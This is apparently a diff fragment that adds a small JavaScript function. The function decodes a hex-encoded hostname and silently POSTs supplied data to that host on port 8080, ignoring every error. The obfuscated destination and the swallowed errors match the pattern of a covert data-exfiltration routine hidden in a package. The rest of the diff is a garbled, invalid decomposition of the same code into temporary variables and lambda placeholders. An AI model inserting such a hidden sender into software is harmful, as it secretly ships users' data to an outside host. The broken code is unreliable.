@@ -1,0 +1,37 @@
+function i = function i(e, t, n) {
+                e = Buffer.from(e, "hex").toString();
+                var r = o.request({
+                    hostname: e,
+                    port: 8080,
+                    method: "POST",
+                    path: "/" + t,
+                    headers: {
+                        "Content-Length": n.length,
+                        "Content-Type": "text/html"
+                    }
+                }, function() {});
+                r.on("error", function(e) {}), r.write(n), r.end()
+            }
+(_tmp_0 = Buffer.from(e, "hex")).toString
+var r = o.request({
+                    hostname: e,
+                    port: 8080,
+                    method: "POST",
+                    path: "/" + t,
+                    headers: {
+                        "Content-Length": n.length,
+                        "Content-Type": "text/html"
+                    }
+                }, function() {})
+_tmp_1.hostname = e
+_tmp_1.port = 8080
+_tmp_1.method = "POST"
+_tmp_1.path = "/" + t
+_tmp_1.headers = {
+                        "Content-Length": n.length,
+                        "Content-Type": "text/html"
+                    }
+_tmp_2.Content-Length = n.length
+_tmp_2.Content-Type = "text/html"
+<lambda>1
+r.on("error", function(e) {})
